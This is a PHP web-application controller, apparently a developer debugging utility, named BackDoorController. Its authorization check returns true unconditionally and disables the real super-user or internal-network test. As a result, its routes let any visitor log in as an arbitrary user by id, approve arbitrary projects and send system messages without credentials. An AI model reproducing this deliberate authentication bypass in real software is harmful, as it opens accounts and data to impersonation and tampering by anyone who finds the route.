<?php
/**
 * User: wangfeng
 * Date: 13-7-18
 * Time: 下午10:02
 */
class BackDoorController extends BaseController
{
    public function validateAuth()
    {
        return true;
        return
            AppHelper::getInstance()->isSuperUser($this->userId)||AppHelper::getInstance()->isInternalNet();
    }

    public function sysMsgAction()
    {
        if(!empty($this->userId)){
            $messageModel=MessageModel::getInstance();
            $messageModel->sendSystemMessage($this->userId, 'test system message!');
            echo 'ok';
        }
        return false;
    }

    public function loginAction($uid){
        $userModel=UserModel::getInstance();
        $user=$userModel->fetchOne(array('_id' => intval($uid)));
        $userModel->setLogin($user);
        $this->redirect('/');
        return false;
    }

    public function grantProjectAction($pid)
    {
        ProjectModel::getInstance()->passProject($pid);
        $this->render_ajax(Constants::CODE_SUCCESS);
        return false;
    }
}